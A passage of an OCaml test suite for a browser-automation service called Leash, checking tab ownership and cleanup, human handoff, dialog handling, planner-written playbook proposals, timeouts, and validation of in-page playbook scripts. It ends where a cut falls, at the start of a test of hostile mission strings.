            (match get "outcome" entry with `String s -> s | _ -> "")
      | _ -> Alcotest.fail "run-9ypy the trace has no procedure");
      (match get "mission_expectations" body with
      | `List [ _; expectation ] ->
          Alcotest.(check bool)
            "run-4j1v the mission's own expectation was verified and did not hold" false
            (match get "passed" expectation with `Bool b -> b | _ -> true);
          Alcotest.(check string)
            "run-4j1v the expectation is the mission's" "the page is cart"
            (match get "sentence" expectation with `String s -> s | _ -> "")
      | _ -> Alcotest.fail "run-4j1v the mission expectations are missing");
      (match get "planner_turns" body with
      | `List [ turn ] ->
          Alcotest.(check string)
            "run-w7ke the planner was asked at the refusal" "blocked"
            (match get "trigger" turn with `String s -> s | _ -> "")
      | _ -> Alcotest.fail "run-w7ke no planner turn");
      (* run-qq3o run-pvmc: the state the procedure level was asked over. Its page kind is
         the modal's, not the offer URL's, and no page text is in it. *)
      let procedure_question =
        match
          List.find_opt
            (fun (question : Run.question) -> question.Run.name = "select_procedure")
            !questions
        with
        | Some question -> question
        | None -> Alcotest.fail "run-qq3o the procedure level was never asked"
      in
      let state = procedure_question.Run.state in
      Alcotest.(check string)
        "run-snk4 the modal is the post-add kind, not the offer URL" "post-add"
        (match
           List.assoc_opt "page_kind"
             (match state with `Assoc fields -> fields | _ -> [])
         with
        | Some (`String kind) -> kind
        | _ -> "");
      Alcotest.(check bool)
        "run-pvmc no page text reaches the upper level" false
        (List.mem_assoc "text" (match state with `Assoc fields -> fields | _ -> []));
      (* run-shgh: the step went through the same service path [drive] uses, and nothing
         acted on the page: the decision was [done]. *)
      let methods =
        Fake.received f
        |> List.filter_map (fun json ->
            match field "method" json with Some (`String name) -> Some name | _ -> None)
      in
      Alcotest.(check bool)
        "run-shgh the step drove the operator level" true
        (List.mem "Accessibility.getFullAXTree" methods);
      Alcotest.(check bool)
        "run-d82w nothing was dispatched" false
        (List.mem "Input.dispatchMouseEvent" methods))

(* run-fwl8: a run starts from a state it can act in. *)
let drive_temporary_cleanup () =
  List.iter
    (fun outcome ->
      rig (fun _ _ _ tabs fake ->
          let f = fake () in
          page_script f (fixture "unlabelled-controls-chrome.json") "Example content";
          document_at ~title:"Example Domain" ~url:"https://example.com/" f;
          let decide ~deadline request =
            if outcome = "model-error" then
              Error
                (P.make_error
                   (Result.get_ok (P.Error_code.of_string "model-unavailable"))
                   ~message:"scripted provider failure")
            else
              Result.map
                (fun (d : Leash__Jev_request.decision) ->
                  { d with operation = Result.get_ok (P.Operation.of_string outcome) })
                (decide_done ~deadline request)
          in
          let reply =
            Leash.Control.handle ~model:"fixture-model" ~installed:[] ~decide tabs
              (run_wire "Open https://example.com and inspect the page")
            |> Yojson.Safe.from_string |> P.decode_reply |> reply_of
          in
          (match (outcome, reply) with
          | "model-error", P.Success body ->
              Alcotest.(check string)
                "fly-8fgl provider failure is terminal evidence" "error"
                (match get "status" body with `String s -> s | _ -> "");
              let error =
                match P.error_of_yojson (get "error" (get "operator_state" body)) with
                | Ok error -> error
                | Error why -> Alcotest.fail why
              in
              Alcotest.(check string)
                "daily-9ggi original error retained" "model-unavailable"
                (P.Error_code.to_string error.P.code)
          | _, P.Success body ->
              Alcotest.(check string)
                "daily-9ggi original outcome retained" outcome
                (match get "status" body with `String s -> s | _ -> "")
          | _ -> Alcotest.fail "daily-9ggi unexpected drive reply");
          let listed =
            result (request tabs "alice" (P.List_tabs { all = false })) |> get "tabs"
          in
          Alcotest.(check bool)
            "daily-9ggi temporary tab closed on every outcome" true
            (listed = `List [])))
    [ "done"; "blocked"; "model-error" ];
  rig (fun _ _ _ tabs fake ->
      let f = fake () in
      page_script f (fixture "unlabelled-controls-chrome.json") "Example content";
      document_at ~title:"Example Domain" ~url:"https://example.com/" f;
      (match
         Leash.Control.handle ~model:"fixture-model" ~installed:[]
           ~decide:(fun ~deadline:_ _ -> raise Exit)
           tabs
           (run_wire "Open https://example.com")
       with
      | exception Exit -> ()
      | _ -> Alcotest.fail "daily-9ggi expected scripted exception");
      let listed =
        result (request tabs "alice" (P.List_tabs { all = false })) |> get "tabs"
      in
      Alcotest.(check bool)
        "daily-9ggi exception closes temporary tab" true
        (listed = `List []));
  rig (fun _ _ _ tabs fake ->
      let f = fake () in
      page_script f (fixture "unlabelled-controls-chrome.json") "Sign in";
      document_at ~title:"Sign in" ~url:product_url f;
      let book =
        match
          Leash.Playbook.load ~caps:(Ox_test.powerbox ())
            "../examples/playbooks/automationexercise.com"
        with
        | Ok book -> book
        | Error why -> Alcotest.fail why
      in
      let plan =
        Run.
          {
            answer = Handoff "Please sign in with your credentials";
            expect = [];
            usage = None;
            pages = [];
          }
      in
      let levels = levels_with ~plan [ "automationexercise.com"; "DONE" ] (ref []) in
      let body =
        Leash.Control.handle ~model:"fixture-model" ~installed:[ book ] ~levels
          ~decide:decide_done tabs
          (run_wire
             "Inspect the catalogue at https://automationexercise.com/product_details/1")
        |> Yojson.Safe.from_string |> P.decode_reply |> decoded
      in
      Alcotest.(check bool)
        "daily-9ggi genuine handoff returned" true
        (get "status" body = str "handoff");
      let listed =
        result (request tabs "alice" (P.List_tabs { all = false })) |> get "tabs"
      in
      Alcotest.(check bool)
        "daily-9ggi human tab preserved" true
        (match listed with
        | `List [ tab ] -> get "state" tab = str "with_human"
        | _ -> false))

let run_refusals () =
  rig (fun _ _ _ tabs fake ->
      let f = fake () in
      let fixture = fixture "unlabelled-controls-chrome.json" in
      page_script f fixture "";
      document_at ~title:"A page" ~url:"https://example.com/" f;
      let h =
        result (request tabs "alice" (P.New { url = Some "https://example.com/" })) |> tab
      in
      let levels = levels_with [] (ref []) in
      let run ?expect who =
        reply_of
          (P.decode_reply
             (Yojson.Safe.from_string
                (Leash.Control.handle ~model:"fixture-model" ~levels ~installed:[]
                   ~decide:decide_done tabs
                   (run_wire ~who ?expect ~tab:h "do the thing"))))
      in
      check_code "run-fwl8 not-owner" "not-owner" (run "bob");
      (* The human's hold: every command on the tab answers [with-human], a run included. *)
      (match
         Leash.Tabs.hand_over tabs ~owner:(owner "alice") ~reason:"look at this" h
       with
      | Ok _ -> ()
      | Error error -> Alcotest.fail error.P.message);
      check_code "run-fwl8 with-human" "with-human" (run "alice");
      ignore (Leash.Tabs.resume tabs ~owner:(owner "human") h);
      (* A dialog waiting to be answered: the run refuses to start rather than fight it. *)
      Fake.emit ~session:"session-1" f ~method_:"Page.javascriptDialogOpening"
        ~params:
          (obj
             [
               ("type", str "alert");
               ("message", str "stay here");
               ("url", str "https://example.com/");
               ("hasBrowserHandler", `Bool true);
             ]);
      let rec wait_dialog n =
        if n = 0 then Alcotest.fail "run-fwl8 the dialog event was not delivered"
        else
          match
            Leash.Tabs.snap tabs ~owner:(owner "alice")
              { tab = h; match_ = None; limit = None; offset = None }
          with
          | Ok { dialog = Some _; _ } -> ()
          | _ ->
              Eio.Fiber.yield ();
              wait_dialog (n - 1)
      in
      wait_dialog 100;
      check_code "run-fwl8 dialog-open" "dialog-open" (run "alice");
      (* daily-9ggi: a mission closes its own tab but preserves a supplied tab. *)
      let opened =
        reply_of
          (P.decode_reply
             (Yojson.Safe.from_string
                (Leash.Control.handle ~model:"fixture-model" ~levels ~installed:[]
                   ~decide:decide_done tabs (run_wire "learn the thing"))))
      in
      (match opened with
      | P.Failure error -> Alcotest.fail error.P.message
      | P.Success body ->
          Alcotest.(check string)
            "daily-9ggi blank mission without URL is explained" "blocked"
            (match get "status" body with `String s -> s | _ -> ""));
      let tabs_now =
        result (request tabs "alice" (P.List_tabs { all = false })) |> get "tabs"
      in
      Alcotest.(check int)
        "daily-9ggi the run cleaned its tab, supplied tab remains" 1
        (match tabs_now with `List xs -> List.length xs | _ -> 0))

(* L32 run-m0r8 run-rq6i: a planner turn through the control seam — the production handler
   writes the procedure it wrote and verified to XDG state, the reply reports the file, and
   the installed playbook is left exactly as it was. Only [playbook accept] merges one. *)
let run_proposal () =
  let state = Filename.temp_file "leash-run-proposal" "" in
  Sys.remove state;
  Unix.mkdir state 0o700;
  let previous = Sys.getenv_opt "XDG_STATE_HOME" in
  (Unix.putenv [@alert "-unsafe_multidomain"]) "XDG_STATE_HOME" state;
  Fun.protect
    ~finally:(fun () ->
      (Unix.putenv [@alert "-unsafe_multidomain"]) "XDG_STATE_HOME"
        (Option.value ~default:"" previous))
    (fun () ->
      rig (fun env sw _ tabs fake ->
          let f = fake () in
          let fixture = fixture "unlabelled-controls-chrome.json" in
          page_script f fixture modal_text;
          document_at ~title:"Blue Top" ~url:product_url f;
          (* dune runs a test from its own directory and `dune exec` from the repository
             root; the example resolves from either. *)
          let playbook =
            match
              Leash.Playbook.load ~caps:(Ox_test.powerbox ())
                "../examples/playbooks/automationexercise.com"
            with
            | Ok book -> book
            | Error _ -> (
                match
                  Leash.Playbook.load ~caps:(Ox_test.powerbox ())
                    "examples/playbooks/automationexercise.com"
                with
                | Ok book -> book
                | Error why -> Alcotest.fail why)
          in
          let read path =
            let channel = open_in_bin path in
            Fun.protect
              ~finally:(fun () -> close_in channel)
              (fun () -> really_input_string channel (in_channel_length channel))
          in
          let before = read playbook.Leash.Playbook.file in
          let h =
            result (request tabs "alice" (P.New { url = Some product_url })) |> tab
          in
          let questions = ref [] in
          (* fly-yolk: procedure BLOCKED enters the operator. A DONE nothing can verify
             still asks the planner once; run-rq6i: it answers with a procedure, which the
             loop runs and verifies, and the next DONE accepts that verification. *)
          let answers = [ "automationexercise.com"; "DONE"; "DONE" ] in
          let planned : Run.plan_answer =
            Run.Procedure
              Leash.Playbook.
                {
                  slug = "check-modal";
                  description = "Check the added-to-cart modal.";
                  args = None;
                  steps =
                    [
                      Goal
                        Leash.Playbook.
                          { goal = "Look at the page."; hint = None; until = None };
                    ];
                  expect = [ "the page is post-add" ];
                  expect_timeout_s = None;
                  repeat = None;
                  max_steps = None;
                  deadline_s = None;
                }
          in
          let plan = Run.{ answer = planned; expect = []; usage = None; pages = [] } in
          let levels = levels_with ~plan answers questions in
          let reply =
            with_ticking_clock env sw (fun () ->
                Leash.Control.handle ~model:"fixture-model" ~levels
                  ~installed:[ playbook ] ~decide:decide_done tabs
                  (run_wire ~tab:h "check the cart"))
            |> Yojson.Safe.from_string |> P.decode_reply
          in
          let body = decoded reply in
          Alcotest.(check string)
            "run-rq6i the planned procedure ends the mission" "done"
            (match get "status" body with `String s -> s | _ -> "");
          (match get "procedures" body with
          | `List [ entry ] ->
              Alcotest.(check string)
                "run-rq6i the trace names it" "check-modal"
                (match get "slug" entry with `String s -> s | _ -> "");
              Alcotest.(check bool)
                "run-m0r8 it is marked planned" true
                (match get "planned" entry with `Bool b -> b | _ -> false)
          | _ -> Alcotest.fail "run-rq6i the trace is not the one planned procedure");
          let expected =
            Filename.concat
              (Filename.concat (Filename.concat state "leash") "proposed")
              "automationexercise.com-check-modal.json"
          in
          (match get "proposals" body with
          | `List [ `String path ] ->
              Alcotest.(check string)
                "run-m0r8 the proposal is where the state directory says" expected path;
              Alcotest.(check bool)
                "run-m0r8 the proposal file exists" true (Sys.file_exists path)
          | _ -> Alcotest.fail "run-m0r8 the run reported no proposal");
          Alcotest.(check string)
            "run-m0r8 the installed playbook is untouched" before
            (read playbook.Leash.Playbook.file);
          match get "planner_turns" body with
          | `List [ turn ] ->
              Alcotest.(check string)
                "run-w7ke the trigger" "blocked"
                (match get "trigger" turn with `String s -> s | _ -> "")
          | _ -> Alcotest.fail "run-w7ke no planner turn"))

(* L33 run-3vat run-xda7: command enters production Tabs.run through Control,
   writes a whole proposed playbook and leaves the installed directory untouched. *)
let discover_proposal () =
  let state = Filename.temp_file "leash-discover" "" in
  Sys.remove state;
  Unix.mkdir state 0o700;
  let previous = Sys.getenv_opt "XDG_STATE_HOME" in
  (Unix.putenv [@alert "-unsafe_multidomain"]) "XDG_STATE_HOME" state;
  Fun.protect
    ~finally:(fun () ->
      (Unix.putenv [@alert "-unsafe_multidomain"]) "XDG_STATE_HOME"
        (Option.value ~default:"" previous))
    (fun () ->
      rig (fun env sw _ tabs fake ->
          let f = fake () in
          page_script f (fixture "unlabelled-controls-chrome.json") modal_text;
          document_at ~title:"Blue Top" ~url:product_url f;
          let proc =
            Leash.Playbook.
              {
                slug = "browse";
                description = "Browse page";
                args = None;
                steps = [ Goal { goal = "Look at page"; hint = None; until = None } ];
                expect = [ "the page is product" ];
                expect_timeout_s = None;
                repeat = None;
                max_steps = None;
                deadline_s = None;
              }
          in
          let plan =
            Run.
              {
                answer = Procedure proc;
                expect = [];
                usage = None;
                pages =
                  [
                    Leash.Playbook.
                      {
                        name = "product";
                        description = "Product page";
                        url_pattern =
                          Some "https://automationexercise.com/product_details/*";
                        text_marker = None;
                      };
                  ];
              }
          in
          let questions = ref [] in
          let pending =
            ref
              [
                plan;
                Run.{ answer = Fail "explored"; expect = []; usage = None; pages = [] };
              ]
          in
          let base = levels_with ~plan [ "browse" ] questions in
          let levels =
            {
              base with
              Run.plan =
                (fun ~deadline:_ _ ->
                  match !pending with
                  | [] -> Alcotest.fail "too many discovery planner turns"
                  | first :: rest ->
                      pending := rest;
                      Ok first);
            }
          in
          let command =
            P.Discover
              {
                site = product_url;
                goal = Some "Learn product page";
                max_turns = Some 4;
                max_steps = Some 10;
                deadline_s = Some 180;
                max_cost = Some 1.;
              }
          in
          let reply =
            with_ticking_clock env sw (fun () ->
                Leash.Control.handle ~model:"fixture-model" ~levels ~decide:decide_done
                  tabs
                  (P.encode_request { owner = owner "alice"; command }
                  |> Yojson.Safe.to_string))
            |> Yojson.Safe.from_string |> P.decode_reply
          in
          let body = decoded reply in
          (match get "proposals" body with
          | `List [ `String path ] ->
              Alcotest.(check bool)
                "full playbook proposal exists" true (Sys.file_exists path);
              (* A proposal is one JSON file, not a playbook directory. *)
              let proposed =
                match Leash.Playbook.of_json ~file:path (Yojson.Safe.from_file path) with
                | Ok book -> book.playbook
                | Error why -> Alcotest.fail why
              in
              Alcotest.(check int) "proposed page kinds" 1 (List.length proposed.pages);
              Alcotest.(check int)
                "verified procedure" 1
                (List.length proposed.procedures)
          | _ -> Alcotest.fail "discovery omitted complete proposal");
          Alcotest.(check bool)
            "not installed" false
            (Sys.file_exists
               (Filename.concat
                  (Filename.concat state "leash/playbooks")
                  "automationexercise.com.json"))))

(* hard-6eei hard-92ik hard-s719 hard-tsva hard-t6cq hard-owci: an event
   emitted before Chrome answers navigation still returns an answerable tab. *)
let dialog_interruptions () =
  rig (fun _ sw _ tabs fake ->
      let fake = fake () in
      Fake.on_method fake "Page.handleJavaScriptDialog" (fun _ ->
          Fake.emit ~session:"session-1" fake ~method_:"Page.javascriptDialogClosed"
            ~params:(obj [ ("result", `Bool true); ("userInput", str "") ]);
          obj []);
      let emit kind ?default_prompt () =
        Fake.emit ~session:"session-1" fake ~method_:"Page.javascriptDialogOpening"
          ~params:
            (obj
               ([
                  ("url", str "https://example.com/");
                  ("message", str "Question");
                  ("type", str kind);
                  ("hasBrowserHandler", `Bool true);
                ]
               @
               match default_prompt with
               | None -> []
               | Some text -> [ ("defaultPrompt", str text) ]))
      in
      Fake.on_method fake "Page.navigate" (fun _ ->
          emit "prompt" ~default_prompt:"Suggested" ();
          obj [ ("frameId", str "frame-1") ]);
      let info =
        settle ~sw "hard-6eei new prompt" (fun () ->
            request tabs "alice" (P.New { url = Some "https://example.com/" }))
        |> result
      in
      let handle = tab info in
      Alcotest.(check string)
        "hard-92ik default prompt" "Suggested"
        (match get "default_prompt" (get "dialog" info) with
        | `String text -> text
        | _ -> "missing");
      Alcotest.(check string)
        "hard-6eei title can be empty" ""
        (match get "title" info with `String text -> text | _ -> "missing");
      check_code "hard-s719 wait blocked" "dialog-open"
        (request tabs "alice"
           (P.Wait
              {
                tab = handle;
                until =
                  {
                    url_prefix = None;
                    text = Some "never";
                    index_gone = None;
                    dialog = None;
                    changed_since = None;
                  };
                timeout_ms = Some 5000;
              }));
      ignore
        (result
           (request tabs "alice"
              (P.Dialog
                 {
                   tab = handle;
                   answer =
                     (match P.Answer.of_string "dismiss" with
                     | Ok x -> x
                     | Error _ -> assert false);
                   text = None;
                 })));
      Fake.on_method fake "Page.navigate" (fun _ ->
          emit "alert" ();
          obj [ ("frameId", str "frame-1") ]);
      let nav =
        settle ~sw "hard-6eei nav alert" (fun () ->
            request tabs "alice"
              (P.Nav { tab = handle; url = "https://example.com/next" }))
        |> result
      in
      Alcotest.(check bool) "hard-6eei same tab handle" true (tab nav = handle);
      Alcotest.(check string)
        "hard-tsva nav dialog" "alert"
        (match get "kind" (get "dialog" nav) with `String text -> text | _ -> "missing");
      ignore
        (result
           (request tabs "alice"
              (P.Dialog
                 {
                   tab = handle;
                   answer =
                     (match P.Answer.of_string "dismiss" with
                     | Ok x -> x
                     | Error _ -> assert false);
                   text = None;
                 })));
      Fake.on_method fake "Target.closeTarget" (fun _ ->
          emit "beforeunload" ();
          obj [ ("success", `Bool true) ]);
      ignore (result (request tabs "alice" (P.Close { tab = handle; force = None })));
      Alcotest.(check bool)
        "hard-t6cq beforeunload accepted" true
        (Fake.received fake
        |> List.exists (fun call ->
            field "method" call = Some (str "Page.handleJavaScriptDialog")
            && Option.bind (field "params" call) (field "accept") = Some (`Bool true))))

(* hard-yi0a: a real Unix listener writes a timeout envelope after cancelling a
   blocked handler, rather than silently closing the connection. *)
let listener_budget_reply () =
  with_runtime (fun runtime ->
      rig (fun env sw _ tabs fake ->
          let tab = result (request tabs "alice" (P.New { url = None })) |> tab in
          Fake.withhold (fake ()) "Target.closeTarget" (fun _ -> true);
          let path = Filename.concat (Filename.concat runtime "leash") "control.sock" in
          let _control =
            match
              Leash.Control.create ~sw ~path
                {
                  Leash.Control.tabs;
                  status_query = (fun () -> []);
                  models_status =
                    (fun () ->
                      P.
                        {
                          configured = false;
                          jev_model = "unconfigured";
                          text_model = "";
                          systemone_endpoint = "";
                          chat_base_url = "";
                        });
                  fs = env#fs;
                  net = env#net;
                  clock = env#clock;
                  logger =
                    Ox_observability.Logger.create ~service:"socket-test" ~clock:env#clock
                      ~mono_clock:env#mono_clock
                      ~reporter:(Ox_observability.Logger.Reporter.writer ignore)
                      ();
                  caps = (Ox_test.powerbox () :> Leash.Control.caps);
                }
            with
            | Ok control -> control
            | Error _ -> Alcotest.fail "hard-yi0a listener refused"
          in
          let flow = Eio.Net.connect ~sw env#net (`Unix path) in
          let wire =
            P.encode_request
              { owner = owner "alice"; command = P.Close { tab; force = None } }
            |> Yojson.Safe.to_string
          in
          Eio.Flow.copy_string (wire ^ "\n") flow;
          Eio.Fiber.fork ~sw (fun () ->
              let rec wait n =
                if n = 0 then Alcotest.fail "hard-yi0a handler never reached Chrome"
                else if
                  Fake.received (fake ())
                  |> List.exists (fun call ->
                      field "method" call = Some (str "Target.closeTarget"))
                then (
                  Ox_test.advance env#clock (Ox.Duration.seconds 2);
                  Ox_test.advance env#clock (Ox.Duration.seconds 2))
                else (
                  Eio.Fiber.yield ();
                  wait (n - 1))
              in
              wait 1000);
          let reply =
            Eio.Buf_read.line (Eio.Buf_read.of_flow flow ~max_size:4096)
            |> Yojson.Safe.from_string
          in
          Alcotest.(check bool)
            "hard-yi0a timeout envelope" false
            (get "ok" reply = `Bool true);
          let failure = get "error" reply in
          Alcotest.(check string)
            "hard-yi0a timeout code" "timeout"
            (match get "code" failure with `String s -> s | _ -> "missing");
          let detail = get "detail" failure in
          Alcotest.(check string)
            "hard-yi0a command" "close"
            (match get "command" detail with `String s -> s | _ -> "missing");
          Alcotest.(check int)
            "hard-yi0a full budget in milliseconds" 1000
            (match get "budget_ms" detail with `Int n -> n | _ -> -1);
          Fake.on_method (fake ()) "Target.closeTarget" (fun _ ->
              obj [ ("success", `Bool true) ])))

(* ---------- L37: playbook scripts at the control seam ---------- *)

let rec rm_rf path =
  match (Unix.lstat path).Unix.st_kind with
  | Unix.S_DIR ->
      Array.iter (fun entry -> rm_rf (Filename.concat path entry)) (Sys.readdir path);
      Unix.rmdir path
  | _ -> Sys.remove path
  | exception Unix.Unix_error _ -> ()

let write_tree root files =
  List.iter
    (fun (path, content) ->
      let file = Filename.concat root path in
      let rec parents p =
        if not (Sys.file_exists p) then (
          parents (Filename.dirname p);
          Unix.mkdir p 0o700)
      in
      parents (Filename.dirname file);
      let channel = open_out_bin file in
      output_string channel content;
      close_out channel)
    files

let list_js =
  "const rows = await (await fetch('/api/books.json')).json();\n\
   return rows.map(r => ({title: r.title, price: r.price}));"

let books_json =
  {|{
 "site":"books.example","entry":"https://books.example/","description":"Books to collect",
 "pages":[{"name":"page","description":"Any page","url_pattern":"https://automationexercise.com/*"}],
 "shapes":{"row":[{"title":"string","price":"number"}],"title":[{"title":"string"}]},
 "scripts":{
   "list":{"file":"scripts/list.js","description":"List the books.","returns":"row"},
   "tiny":{"source":"return [{title: 'a long title that is over ten bytes'}]","description":"A tiny list.","returns":"title","max_bytes":10},
   "broken":{"source":"return [SYNTAX_BAD","description":"Broken on purpose.","returns":"title"}
 },
 "procedures":[{"slug":"collect","description":"Collect the list.","args":{"q":{"from":"mission"}},
   "steps":[{"script":"list","args":{"q":"{q}"}}],"expect":["the page shows Added!"]},
  {"slug":"open","description":"Open the list.","steps":[{"goal":"Open the list."},{"use":"collect"}],"expect":["the page shows Added!"]}]
}|}

(* The playbook directory is made and loaded the way an operator's is, under a directory
   called [books]. *)
let with_books f =
  let root = Filename.temp_file "leash-books" "" in
  Sys.remove root;
  Unix.mkdir root 0o700;
  Fun.protect
    ~finally:(fun () -> rm_rf root)
    (fun () ->
      write_tree root
        [ ("books/playbook.json", books_json); ("books/scripts/list.js", list_js) ];
      match
        Leash.Playbook.load ~caps:(Ox_test.powerbox ()) (Filename.concat root "books")
      with
      | Ok book -> f book
      | Error why -> Alcotest.fail why)

let handle_with ?levels ?text_helper ?(decide = decide_done) ~installed tabs who command =
  let wire = P.encode_request { owner = owner who; command } |> Yojson.Safe.to_string in
  match
    P.decode_reply
      (Yojson.Safe.from_string
         (Leash.Control.handle ~model:"fixture-model" ?levels ?text_helper ~installed
            ~decide tabs wire))
  with
  | Ok reply -> reply
  | Error why -> Alcotest.fail why

let value_reply value =
  obj [ ("result", obj [ ("type", str "object"); ("value", value) ]) ]

let threw description =
  obj
    [
      ("result", obj [ ("type", str "object") ]);
      ( "exceptionDetails",
        obj
          [
            ("text", str "Uncaught");
            ("exception", obj [ ("description", str description) ]);
          ] );
    ]

(* A page whose script calls are answered by [reply]; everything else is [page_script]'s. *)
let script_page fake ~reply =
  page_script fake (fixture "unlabelled-controls-chrome.json") modal_text;
  document_at ~title:"Books" ~url:product_url fake;
  let scroll_metrics =
    value_reply (obj [ ("y", `Int 0); ("viewport", `Int 400); ("height", `Int 1000) ])
  in
  Fake.on_method fake "Runtime.callFunctionOn" (fun request ->
      let params = get "params" request in
      match get "functionDeclaration" params with
      | `String declaration
        when String.starts_with ~prefix:"async function(args)" declaration ->
          reply declaration params
      | _ -> scroll_metrics)

let payloads fake =
  (* every text the service handed the page's JavaScript engine, in order *)
  Fake.received fake
  |> List.filter_map (fun json ->
      match (field "method" json, field "params" json) with
      | Some (`String "Runtime.evaluate"), Some params -> (
          match field "expression" params with Some (`String e) -> Some e | _ -> None)
      | Some (`String "Runtime.callFunctionOn"), Some params -> (
          match field "functionDeclaration" params with
          | Some (`String d) -> Some d
          | _ -> None)
      | _ -> None)

let script_calls fake =
  Fake.received fake
  |> List.filter_map (fun json ->
      match (field "method" json, field "params" json) with
      | Some (`String "Runtime.callFunctionOn"), Some params -> (
          match field "functionDeclaration" params with
          | Some (`String d) when String.starts_with ~prefix:"async function(args)" d ->
              Some params
          | _ -> None)
      | _ -> None)

let wrapped code = "async function(args) {\n" ^ code ^ "\n}"

let books_rows =
  `List
    [
      `Assoc [ ("title", `String "A Light in the Attic"); ("price", `Float 51.77) ];
      `Assoc [ ("title", `String "Tipping the Velvet"); ("price", `Int 53) ];
    ]

let playbook_test_command () =
  with_books (fun book ->
      rig (fun _ _ _ tabs fake ->
          let f = fake () in
          let answer = ref (value_reply books_rows) in
          script_page f ~reply:(fun _ _ -> !answer);
          let h =
            result (request tabs "alice" (P.New { url = Some product_url })) |> tab
          in
          let test ?(who = "alice") ?args script =
            handle_with ~installed:[ book ] tabs who
              (P.Playbook_test { tab = h; script; args })
          in
          (* extr-mp5z extr-8o1h extr-vgir: the script runs in the page through
             callFunctionOn with awaitPromise, as the body of an async function of args. *)
          let body = result (test ~args:(obj [ ("q", str "gpu") ]) "books/list") in
          Alcotest.(check bool)
            "extr-mp5z the validated output is printed" true
            (get "value" body = books_rows);
          Alcotest.(check bool)
            "extr-mp5z the record count" true
            (get "records" body = `Int 2);
          (match script_calls f with
          | [ call ] ->
              Alcotest.(check bool)
                "extr-vgir the file's text, fetch and all, is the function body" true
                (get "functionDeclaration" call = str (wrapped list_js));
              Alcotest.(check bool)
                "extr-8o1h awaitPromise, so a script may await a fetch" true
                (get "awaitPromise" call = `Bool true);
              Alcotest.(check bool)
                "extr-8o1h the result comes by value" true
                (get "returnByValue" call = `Bool true);
              Alcotest.(check bool)
                "extr-8o1h the arguments are JSON" true
                (get "arguments" call
                = `List [ obj [ ("value", obj [ ("q", str "gpu") ]) ] ])
          | calls -> Alcotest.failf "extr-mp5z %d script calls" (List.length calls));
          (* extr-8o1h: the result must fit its shape, and the error names the path. *)
          answer :=
            value_reply
              (`List [ `Assoc [ ("title", `String "x"); ("price", `String "9") ] ]);
          (match test "books/list" with
          | P.Failure error ->
              Alcotest.(check string)
                "extr-8o1h invalid output" "script-invalid"
                (P.Error_code.to_string error.P.code);
              Alcotest.(check string)
                "extr-8o1h the path of the first mismatch"
                "$[0].price: expected number, got string" error.P.message
          | P.Success _ -> Alcotest.fail "extr-8o1h invalid output was accepted");
          (* extr-8o1h: a script that throws is script-failed with what it threw. *)
          answer := threw "TypeError: rows is not iterable\n    at <anonymous>:2:9";
          (match test "books/list" with
          | P.Failure error ->
              Alcotest.(check string)
                "extr-8o1h a throw" "script-failed"
                (P.Error_code.to_string error.P.code);
              Alcotest.(check bool)
                "extr-mp5z the exception is shown to the author" true
                (contains error.P.message "rows is not iterable")
          | P.Success _ -> Alcotest.fail "extr-8o1h a throw was accepted");
          (* extr-8o1h: a result over the script's bound is never returned as data. *)
          answer :=
            value_reply
              (`List
                 [ `Assoc [ ("title", `String "a long title that is over ten bytes") ] ]);
          check_code "extr-8o1h too large" "too-large" (test "books/tiny");
          (* names: nothing else is looked up, nothing is sent for what is not a script *)
          let before = List.length (payloads f) in
          check_code "extr-mp5z no such script" "invalid-request" (test "books/absent");
          check_code "extr-mp5z no such playbook" "invalid-request" (test "shelf/list");
          check_code "extr-mp5z the reference is playbook/script" "invalid-request"
            (test "books");
          check_code "extr-k40c a path is not a playbook name" "invalid-request"
            (test "../books/list");
          check_code "extr-mp5z args are strings" "invalid-request"
            (test ~args:(obj [ ("q", `Int 1) ]) "books/list");
          check_code "extr-mp5z owner-bound" "not-owner" (test ~who:"bob" "books/list");
          Alcotest.(check int)
            "extr-k40c a refusal reaches the page with nothing" before
            (List.length (payloads f))))

let playbook_check_command () =
  with_books (fun book ->
      rig (fun _ _ _ tabs fake ->
          let f = fake () in
          Fake.on_method f "Runtime.evaluate" (fun request ->
              match get "expression" (get "params" request) with
              | `String "globalThis" ->
                  obj [ ("result", obj [ ("objectId", str "global-object") ]) ]
              | `String e when contains e "getPrototypeOf(async function" ->
                  value_reply
                    (if contains e "SYNTAX_BAD" then
                       str "SyntaxError: missing ] after element list"
                     else `Null)
              | _ -> obj [ ("result", obj [ ("type", str "undefined") ]) ]);
          let body =
            result
              (handle_with ~installed:[ book ] tabs "alice"
                 (P.Playbook_check { playbook = "books" }))
          in
          let verdicts =
            match get "scripts" body with
            | `List xs -> xs
            | _ -> Alcotest.fail "no scripts"
          in
          let verdict name =
            match List.find_opt (fun v -> get "script" v = str name) verdicts with
            | Some v -> v
            | None -> Alcotest.failf "extr-lslp no verdict for %s" name
          in
          Alcotest.(check bool)
            "extr-lslp a good script compiles" true
            (get "ok" (verdict "list") = `Bool true);
          Alcotest.(check bool)
            "extr-lslp a syntax error is reported" true
            (get "ok" (verdict "broken") = `Bool false
            && contains
                 (match get "error" (verdict "broken") with `String e -> e | _ -> "")
                 "missing ]");
          (* Compiled, never called: no callFunctionOn, the text only inside new Function. *)
          Alcotest.(check int)
            "extr-lslp nothing was called" 0
            (List.length (script_calls f));
          let compiled =
            payloads f
            |> List.filter (fun e -> contains e "getPrototypeOf(async function")
          in
          Alcotest.(check int) "extr-lslp one compile per script" 3 (List.length compiled);
          Alcotest.(check bool)
            "extr-lslp the file's text is in a compile" true
            (List.exists
               (fun e -> contains e (Yojson.Safe.to_string (str list_js)))
               compiled);
          (* The blank page is the caller's for the duration and gone after. *)
          let created =
            Fake.received f
            |> List.filter (fun j -> field "method" j = Some (str "Target.createTarget"))
          in
          Alcotest.(check bool)
            "extr-lslp a blank tab was used" true
            (List.for_all
               (fun j -> get "url" (get "params" j) = str "about:blank")
               created
            && created <> []);
          Alcotest.(check bool)
            "extr-lslp and closed" true
            (List.exists
               (fun j -> field "method" j = Some (str "Target.closeTarget"))
               (Fake.received f));
          Alcotest.(check bool)
            "extr-lslp no tab is left" true
            (get "open" (get "tabs" (result (request tabs "alice" P.Status))) = `Int 0);
          check_code "extr-lslp no such playbook" "invalid-request"
            (handle_with ~installed:[ book ] tabs "alice"
               (P.Playbook_check { playbook = "shelf" }))))

(* extr-8o1h extr-k40c: a mission whose every model-controlled string is hostile — the
   mission text, the argument the text helper fills — runs a script step. The page's engine
   is handed the playbook's script text exactly, with the hostile value only inside the
   JSON arguments; every other text it is handed is one the service itself owns. *)
let run_scripts ?out hostile =
  with_books (fun book ->
      rig (fun env sw _ tabs fake ->
          let f = fake () in
